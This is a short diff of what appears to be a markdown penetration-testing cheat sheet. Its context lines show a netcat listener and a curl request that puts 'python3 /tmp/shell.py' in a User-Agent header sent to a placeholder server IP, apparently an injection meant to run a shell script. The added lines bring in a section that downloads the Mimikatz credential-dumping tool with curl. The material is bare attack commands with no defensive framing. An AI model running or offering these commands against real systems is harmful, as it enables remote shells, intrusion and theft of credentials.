@@ -74,3 +74,11 @@ nc -l 4443
 ```
 curl -H "User-Agent: python3 /tmp/shell.py" http://<serverip>:8080
 ```
+
+
+#### Mimikatz ?
+
+```
+curl -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip >> mimi.zip
+
+```
